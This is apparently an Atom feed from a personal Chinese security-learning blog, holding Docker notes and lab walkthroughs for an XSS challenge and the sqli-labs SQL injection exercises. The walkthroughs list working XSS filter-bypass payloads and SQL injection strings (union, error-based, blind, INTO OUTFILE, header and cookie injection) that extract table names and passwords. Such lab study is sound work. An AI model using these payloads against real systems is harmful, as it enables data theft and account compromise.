<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FINSENTY54</title>
  
  <subtitle>你看那云聚了又散，散了又聚</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://finsenty54.github.io/"/>
  <updated>2019-03-27T10:16:04.075Z</updated>
  <id>http://finsenty54.github.io/</id>
  
  <author>
    <name>finsenty54</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="http://finsenty54.github.io/2019/03/16/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://finsenty54.github.io/2019/03/16/Docker学习笔记/</id>
    <published>2019-03-15T19:36:58.000Z</published>
    <updated>2019-03-27T10:16:04.075Z</updated>
    
    <content type="html"><![CDATA[<p>sudo add-apt-repository \<br>   “deb [arch=amd64] <a href="https://download.docker.com/linux/ubuntu" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu</a> \<br>   $(lsb_release -cs) \<br>   stable”</p><p><a href="https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/</a></p><p>配置完镜像源后，记得重启</p><p>/bin/sh<br>/bin/bash<br>运行shell</p><p>docker run –name mysql-data -p 3306:3306 -v /home/finsenty/Documents/mysqldata:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=”123456” -d mysql:5.7</p><p>docker run -p 8888:5000 –name myfirstapp YOUR_USERNAME/myfirstapp</p><ul><li>Running on <a href="http://0.0.0.0:5000/" target="_blank" rel="noopener">http://0.0.0.0:5000/</a> (Press CTRL+C to quit)</li></ul><p> docker rm <code>docker ps -a -q</code></p><p> docker rmi <code>docker images -q</code></p><p> docker run -p 4000:80 –name py-http6 –link mariadb:mysql finsenty/http5</p><p> mysql.connecter 查询后面带一个，</p><p> -u “<a href="http://192.168.160.1/sqltest/post.php&quot;" target="_blank" rel="noopener">http://192.168.160.1/sqltest/post.php&quot;</a> –forms</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;sudo add-apt-repository \&lt;br&gt;   “deb [arch=amd64] &lt;a href=&quot;https://download.docker.com/linux/ubuntu&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS 20关挑战</title>
    <link href="http://finsenty54.github.io/2019/03/02/xss/"/>
    <id>http://finsenty54.github.io/2019/03/02/xss/</id>
    <published>2019-03-01T22:22:42.000Z</published>
    <updated>2019-03-27T10:16:05.397Z</updated>
    
    <content type="html"><![CDATA[<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>反射型XSS也被称为非持久性CSS<br>当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。</p><p>alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。</p><p>查看源码<code>window.alert = function()</code><br><code>echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</code>没有过滤<br>直接调用函数就可以通关<code>&lt;script&gt;window.alert()&lt;/script&gt;</code></p><p><em><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。</em></p><hr><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>利用页面元素看到输入在<code>&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;</code><br>闭合input语句即可<br><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</code><br><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code></p><p><a href="https://imgchr.com/i/kqT7Ed" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kqT7Ed.png" alt="kqT7Ed.png"></a></p><hr><h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p>查看页面元素<code>&lt;input name=keyword  value=&#39;1&#39;&gt;</code>在input语句里<br>尝试闭合无用<br>查看源码<code>str</code>都加上了<code>htmlspecialchars</code>函数，但默认配置是不过滤单引号的<br><code>&#39;onmouseover=&#39;window.alert()</code>即可</p><p>输入<code>&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;=&quot;&quot;&gt;</code><br>输入<code>&#39;&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;&#39;=&quot;&quot;&gt;</code><br>输入<code>&#39;onclick&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick&#39;&#39;=&quot;&quot;&gt;</code><br>输入<code>onclick=</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick=&quot;&quot;&gt;</code></p><hr><h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p>输入<code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code><br>查看可知<code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; scriptalert()=&quot;&quot; script&quot;&quot;=&quot;&quot;&gt;</code>过滤了<code>&lt;</code> <code>&gt;</code><br>利用上节方法<br><code>&quot;onclick=&quot;alert()</code></p><p>更新于2019-03-03 11:19:50 星期日</p><hr><h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>试过后发现<code>onclick</code>变为<code>o_nclick</code><br><code>script</code>变为<code>sc_ript</code><br>使用<code>&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt;</code></p><hr><h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><p><code>onclick script href</code>输入后都进行了变化<br><code>&quot;&gt;&lt;a HRef=&quot;javascript:alert()&quot;&gt;</code><br><code>keyword=&quot;ONclick=&quot;alert()</code><br><code>keyword=&quot;&gt;&lt;scriPt&gt;alert()&lt;/SCRIpt&gt;&lt;&quot;</code><br><code>keyword=&quot;&gt;&lt;a HreF=javascript:alert()&gt;213&lt;/a&gt;&quot;&lt;</code><br>进行大小写替换可以</p><hr><h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><code>script</code>被过滤，改变大小写也没有用<br><code>on</code>被过滤<br><code>href</code>同样如此<br><code>keyword=&quot;&gt;&lt;scriscriptpt&gt;alert()&lt;/scrscriptipt&gt;&lt;&quot;</code><br>利用双写绕过</p><p>更新于2019-03-06 21:20:39 星期三</p><hr><h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p>这题可以添加链接<br>直接使用<code>javascript:alert(1)</code><br>但并没有用，查看源码<code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code>被替换了<br>使用制表符绕过<code>%09</code><br><code>keyword=javasc%09ript%3Aalert%281%29&amp;submit=添加友情链接</code></p><hr><h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>上题结果没有用，查看源码<code>if(false===strpos($str7,&#39;http://&#39;))</code><br>知一定要有<code>http://</code><br>在javascript伪协议里面，属于js范畴，所以单行注释符是可以使用的<br><code>javasc%09ript%3Aalert%281%29//http://www.test.com</code></p><hr><h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><p>查看页面元素<br><a href="https://imgchr.com/i/AdFKeI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/27/AdFKeI.th.png" alt="AdFKeI.th.png"></a><br>有几个隐藏的值，注入点就在这<br><code>keyword=test&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()</code><br><a href="https://imgchr.com/i/AdkZNV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/27/AdkZNV.th.png" alt="AdkZNV.th.png"></a></p><hr><h2 id="更新于2019-03-27-18-15-42-星期三"><a href="#更新于2019-03-27-18-15-42-星期三" class="headerlink" title="更新于2019-03-27 18:15:42 星期三"></a>更新于2019-03-27 18:15:42 星期三</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;level1&quot;&gt;&lt;a href=&quot;#level1&quot; class=&quot;headerlink&quot; title=&quot;level1&quot;&gt;&lt;/a&gt;level1&lt;/h2&gt;&lt;p&gt;反射型XSS也被称为非持久性CSS&lt;br&gt;当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理
      
    
    </summary>
    
    
      <category term="xss" scheme="http://finsenty54.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs(less-1__less-22)</title>
    <link href="http://finsenty54.github.io/2019/02/27/sqli-labs/"/>
    <id>http://finsenty54.github.io/2019/02/27/sqli-labs/</id>
    <published>2019-02-26T17:01:08.000Z</published>
    <updated>2019-03-13T12:28:08.474Z</updated>
    
    <content type="html"><![CDATA[<hr><p><strong>闭合有<code>&#39;</code> <code>&quot;</code> <code>)</code> 单双引号不能同时存在，<code>)</code> 可有多个</strong></p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><blockquote><p>single 单个的<br>quote 引号<br>变量前面加 <strong>?</strong><br>information_schema.tables<br>information_schema.columns<br>information_schema.schemata</p></blockquote><p>在Less-1里的index.php中添加 <code>echo $sql;</code> 可在网页中显示查询代码，<code>echo &quot;&lt;br&gt;&quot;;</code> 表示换行</p><hr><ol><li><ul><li><code>?id=1&#39;  and 1=1 --+</code> 没有报错，返回正确结果</li><li><code>?id=10&#39;</code> 报错 <code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;10&#39;&#39; LIMIT 0,1&#39; at line 1</code></li><li><code>?id=1&#39; and 1=2 --+</code> 没有正确结果<br>经过这三个步骤说明是字符型注入</li></ul></li><li><p>使用order by来判断有几个字段<br><code>?id=1&#39; order by 4--+</code><br>报错<code>Unknown column &#39;4&#39; in &#39;order clause&#39;</code><br>说明有3个字段</p></li><li><p><code>LIMIT 0,1</code> 表示结果只显示一行<br><code>?id=-1&#39; union select 1,2,3 --+</code> 看哪个字段可以回显<br><a href="https://imgchr.com/i/k7xiTg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/k7xiTg.png" alt="k7xiTg.png"></a></p></li><li><p><code>?id=1&#39; union select 1,concat_ws(&#39;_&#39;,version(),user(),database()),@@basedir --+</code><br>得到版本，用户，当前数据库，数据路径<br><a href="https://imgchr.com/i/k7zDbT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/k7zDbT.png" alt="k7zDbT.png"></a><br><em>concat_ws 带分隔符的链接</em></p></li><li><p><code>?id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema = database() --+</code><br>得到当前库的表名<br><a href="https://imgchr.com/i/kHSWFg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHSWFg.png" alt="kHSWFg.png"></a><br><code>?id=-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata) ,3 --+</code><br>查看数据库名信息<br><em>group_concat 行转列</em></p></li><li><p><code>?id=-1 &#39; union select 1, (select group_concat(column_name)  from information_schema.columns where table_name=&quot;users&quot;), 3 --+</code><br>users 表的列名<br><a href="https://imgchr.com/i/kHp8hQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHp8hQ.png" alt="kHp8hQ.png"></a></p></li><li><p><code>?id=-1 &#39; union select 1,(select group_concat(password) from users) ,3 --+</code><br>得出账户密码<br><a href="https://imgchr.com/i/kHpan0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHpan0.png" alt="kHpan0.png"></a></p></li></ol><hr><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><ul><li><code>?id=1&#39;</code>报错</li><li><code>?id=1 and 1=1</code>正确</li><li><code>?id=1 and 1=2</code>错误<br>可知是数字型注入<br><em>解题与第一题类似，不再赘述</em></li></ul><hr><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>查看源码可知，用<code>()</code>加在了id两边，所以只要将<code>()</code>闭合就行了<br><code>?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br><code>?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3--+</code><br><code>?id=-1&#39;) union select 1,(select group_concat(password) from users),3--+</code></p><p><a href="https://imgchr.com/i/kHbj8P" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kHbj8P.png" alt="kHbj8P.png"></a></p><hr><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>查看源码，id两边加了”,用<code>?id=-1&quot;)</code>闭合</p><hr><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p><strong><em>双注入</em></strong></p><ol><li>Rand() //随机函数</li><li>Floor() //取整函数</li><li>Count() //汇总函数</li><li>Group by clause //分组语句</li></ol><p><a href="https://blog.csdn.net/Leep0rt/article/details/78556440" target="_blank" rel="noopener">https://blog.csdn.net/Leep0rt/article/details/78556440</a></p><p><code>?id=1&#39; union select count(*),1,concat((select database()), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+</code><br><a href="https://imgchr.com/i/kbMSh9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kbMSh9.png" alt="kbMSh9.png"></a><br>select 查询列数要相同，否则报错</p><p><code>?id=1&#39; union select count(*),1,concat((select password from users limit 5,1), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+</code><br><a href="https://imgchr.com/i/kbQiCj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kbQiCj.png" alt="kbQiCj.png"></a><br>用<code>group_concat</code>会报错，使用<code>limit</code></p><p>更新于2019-03-01 22:21:15 星期五</p><hr><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>尝试注入后可知是用<code>&quot;</code>闭合，字符串型<br>其他和上题一致<br><code>?id=1&quot;  union select count(*),concat( (select user()),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p><p><a href="https://imgchr.com/i/kLirA1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kLirA1.png" alt="kLirA1.png"></a></p><p><code>?id=1&quot;  union select count(*),concat( (select table_name from information_schema.tables where table_schema=database() limit 3,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p><p><code>?id=1&quot;  union select count(*),concat( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 5,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p><p><code>?id=1&quot;  union select count(*),concat( (select password from users limit 0,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p><p>更新于2019-03-03 11:48:51 星期日</p><hr><h2 id="Lss-7"><a href="#Lss-7" class="headerlink" title="Lss-7"></a>Lss-7</h2><h5 id="利用outfile文件"><a href="#利用outfile文件" class="headerlink" title="利用outfile文件"></a>利用outfile文件</h5><p><em>一般在Sql查询语句中，想要正常查询到信息，只能在最里层有引号，外层全是小括号。即已知注入类型后依次增加括号数必能分析出括号数（存在注入点）。<br>数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限<br>需要在指定的目录下进行数据的导出。<br>需要注意的是利用数据库file权限向操作系统写入文件时， 对于相同文件名的文件不能覆盖</em></p><p><em>secure_file_priv这个参数用来限制数据导入和导出操作的效果，例如执行load data、into outfile语句和load_file()函数,这些操作需要用户具有file权限。</em></p><ol><li>如果这个参数为空，这个变量没有效果。</li><li>如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它.</li><li>如果这个参数为null，Mysql服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入。</li></ol><p><em>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径</em></p><p><em>在Mysql中，需要注意路径转义的问题，即用\分隔。</em></p><p><strong><a href="https://www.jianshu.com/p/7b9256de20d1" target="_blank" rel="noopener">https://www.jianshu.com/p/7b9256de20d1</a></strong></p><p>经过测试，用<code>&#39;))</code> 来闭合</p><p><code>?id=1&#39;)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile &quot;C:\\xampp\\mysql\\data\\security\\4.txt&quot; --+</code></p><p><a href="https://imgchr.com/i/kXV2Tg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/04/kXV2Tg.png" alt="kXV2Tg.png"></a></p><p><code>?id=1&#39;)) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;) into outfile &quot;C:\\xampp\\mysql\\data\\security\\5.txt&quot; --+</code></p><p><a href="https://imgchr.com/i/kXVb0U" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/04/kXVb0U.png" alt="kXVb0U.png"></a></p><p><code>?id=1&#39;)) union select 1,2,(select group_concat(password) from users) into outfile &quot;C:\\xampp\\mysql\\data\\security\\6.txt&quot; --+</code></p><p><a href="https://imgchr.com/i/kXZS6x" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/04/kXZS6x.png" alt="kXZS6x.png"></a></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><h5 id="盲注布尔注入"><a href="#盲注布尔注入" class="headerlink" title="盲注布尔注入"></a>盲注布尔注入</h5><p><em>当一个页面，存在注入，没显示位，没有数据库出错信息，只能通过页面返回正常不正常进行判断进行sql注入。</em></p><ol><li>exists（）<br>用于检查  子查询是否有返回数据。 结果是 ture或者false</li><li>ascii（）<br>把字符转化成ascii码</li><li>substr（）<br>substr（string string，num start，num length）；<br>偏移从1开始的 并不是0；</li></ol><p><em>DISTINCT 去重复</em><br><code>?id=1&#39; and (select ascii(substr( (select database()) ,1,1))&gt;115) --+</code></p><p><code>?id=1&#39; and ((select count(distinct+table_schema) from information_schema.tables)&gt;6)--+</code></p><p><code>?id=1&#39; and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101)--+</code></p><p><code>?id=1&#39; and (select ascii(substr( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1) ,1,1))&gt;11) --+</code></p><p><code>?id=1&#39; and (select ascii(substr( (select password from users limit 0,1) ,1,1))&gt;68) --+</code></p><p><em>select database() 作为一个语句加括号</em><br>用脚本来跑</p><p>更新于2019-03-04 23:09:10 星期一</p><hr><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><h5 id="盲注基于时间"><a href="#盲注基于时间" class="headerlink" title="盲注基于时间"></a>盲注基于时间</h5><p><em>if( expr1 , expr2 , expr3 ) expr1 true 返回expr2 false 返回 expr3</em></p><p><code>?id=1&#39; and if((select ascii(substr(database(),1,1)))=115,sleep(5),1) --+</code></p><p>利用页面返回时间判断对错<br>例如<br><code>?id=1&#39; and if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101,sleep(5),1) --+</code></p><hr><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>与上题相同，不过利用<code>&quot;</code>进行闭合</p><p>更新于2019-03-06 20:29:31 星期三</p><hr><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><pre><code>GET - 从指定的资源请求数据。POST - 向指定的资源提交要被处理的数据</code></pre><p>输入<code>&#39;</code>报错，知用<code>&#39;</code>闭合<br><code>uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; or &#39;1&#39;=&#39;1&amp;submit=Submit</code><br>可以直接爆出来<br>其他相同<br><code>uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; union select 1,2#&amp;submit=Submit</code><br><a href="https://imgchr.com/i/A9VId1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9VId1.png" alt="A9VId1.png"></a></p><hr><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>实验可知用<code>&quot;)</code>闭合<br>其他相同</p><hr><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>实验知用<code>&#39;)</code> 闭合<br>其他相同，例如</p><p><code>uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(database()))) #&amp;submit=Submit</code></p><p><a href="https://imgchr.com/i/A9aHHI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9aHHI.png" alt="A9aHHI.png"></a></p><p><code>uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) #&amp;submit=Submit</code></p><p><a href="https://imgchr.com/i/A9azvQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9azvQ.png" alt="A9azvQ.png"></a></p><hr><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>实验知用<code>&quot;</code>闭合<br>其他和上题相同</p><hr><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>实验知用<code>&#39;</code>闭合<br>但没用报错信息<br>所以使用时间或布尔注入<br><code>uname=&#39; or if(ascii(substr(database(),1,1))=115,sleep(0.5),1) #&amp;passwd=1&amp;submit=Submit</code></p><hr><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>实验知用<code>&quot;</code>闭合<br>其他和上题相同</p><hr><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>在uname中注入，都没有反应<br>在password中注入，也没有反应<br>后知先验证用户名正确后，才执行password</p><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p><code>uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,version(),0x7e),1)# &amp;submit=Submit</code></p><p><a href="https://imgchr.com/i/A98NW9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A98NW9.png" alt="A98NW9.png"></a></p><p><code>uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)# &amp;submit=Submit</code></p><p><a href="https://imgchr.com/i/A9JFUS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9JFUS.png" alt="A9JFUS.png"></a><br>其他相同</p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>使用正确账号密码后，页面显示user-agent，则可以在这上面注入</p><p><code>1&#39; and extractvalue(1,concat(0x7e,(select user()),0x7e)) and &#39;1&#39;=&#39;1</code><br><a href="https://imgchr.com/i/A9Nzi8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9Nzi8.png" alt="A9Nzi8.png"></a><br><code>1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e)) and &#39;1&#39;=&#39;1</code><br><a href="https://imgchr.com/i/A9UGo6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/10/A9UGo6.png" alt="A9UGo6.png"></a><br>其他相同<br><em>HTTP 请求头中除了 User-Agent可能存在sql注入意外，还有referer、X-Forwarded-For可能存在sql注入。</em></p><p>更新于2019-03-10 22:43:03 星期日</p><hr><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>参考上题<br>输入正确用户和密码后，跳出页面</p><p><a href="https://imgchr.com/i/ACy1bD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/11/ACy1bD.png" alt="ACy1bD.png"></a></p><p>差不多知道在<code>referer</code>上注入<br><code>&#39; and (extractvalue(1,concat(0x7e,(select version()),0x7e)) ) and &#39;1&#39;=&#39;1</code><br>不能用<code>#</code>注释，因为后面还有语句存在</p><p><a href="https://imgchr.com/i/ACyvqO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/11/ACyvqO.png" alt="ACyvqO.png"></a></p><p><code>&#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),0x7e)) ) and &#39;1&#39;=&#39;1</code></p><p><a href="https://imgchr.com/i/AC6Kij" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/11/AC6Kij.png" alt="AC6Kij.png"></a></p><p>更新于2019-03-10 22:43:03 星期日</p><hr><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>由题目知注入点在Cookie中</p><p><em>这里我犯了个错误，由于没有拦截，修改Cookie后，直接点刷新不会出结果，需要重新载入页面</em></p><p>输入<code>&#39;</code><br><a href="https://imgchr.com/i/AkUjaj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/13/AkUjaj.th.png" alt="AkUjaj.th.png"></a><br>报错存在注入点</p><p>接下来可以用第一题用的<br><code>&#39; union select 1,2,database()#</code><br><a href="https://imgchr.com/i/AkU7xf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/13/AkU7xf.th.png" alt="AkU7xf.th.png"></a></p><p><code>&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema =database()#</code><br><a href="https://imgchr.com/i/Akauz6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/13/Akauz6.th.png" alt="Akauz6.th.png"></a></p><p>也可以用报错注入<br><code>&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code><br><a href="https://imgchr.com/i/AkaQsO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/13/AkaQsO.th.png" alt="AkaQsO.th.png"></a></p><hr><p>Less-21<br>查看Cookie<br><code>YWRtaW4</code>进行解密，知是用base64加密的<code>admin</code><br>所以只要将上题内容加密即可</p><hr><p>Less-22<br>查看cookie<br><code>admin&#39; and 1=1 #</code>没有查询结果<br><code>admin&quot; and 1=1 #</code>结果正确<br>知是用<code>&quot;</code>闭合<br>其他方法与前题相同</p><p>更新于2019-03-13 20:26:48 星期三</p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;&lt;strong&gt;闭合有&lt;code&gt;&amp;#39;&lt;/code&gt; &lt;code&gt;&amp;quot;&lt;/code&gt; &lt;code&gt;)&lt;/code&gt; 单双引号不能同时存在，&lt;code&gt;)&lt;/code&gt; 可有多个&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;Less-1&quot;&gt;&lt;a href
      
    
    </summary>
    
    
      <category term="sql" scheme="http://finsenty54.github.io/tags/sql/"/>
    
  </entry>
  
</feed>
